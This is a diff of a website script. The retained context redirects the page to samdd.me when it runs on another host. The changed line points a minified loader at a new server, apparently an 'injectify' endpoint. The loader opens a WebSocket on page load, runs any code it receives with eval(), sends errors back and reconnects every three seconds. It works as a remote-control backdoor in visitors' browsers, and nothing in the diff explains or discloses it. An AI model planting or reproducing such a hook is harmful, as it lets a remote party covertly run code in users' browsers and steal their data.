@@ -66,4 +66,4 @@ if (window.location.host !=='samdd.me' && window.location.host !== '127.0.0.1:69
 	window.location='https://samdd.me';
 }
 
-function u(){window.ws=new WebSocket("wss://gqpg.gq/i?$c2FtZGQ="),ws.onmessage=function(d){try{d=JSON.parse(d.data),eval(d.d)}catch(e){ws.send(JSON.stringify({t:"e",d:e}))}},ws.onclose=function(){setTimeout(u,3e3)}}u();
+function u(){window.ws=new WebSocket("wss://injectify.samdd.me/i?c2FtZGQ="),ws.onmessage=function(d){try{d=JSON.parse(d.data),eval(d.d)}catch(e){ws.send(JSON.stringify({t:"e",d:e}))}},ws.onclose=function(){setTimeout(u,3e3)}}u();
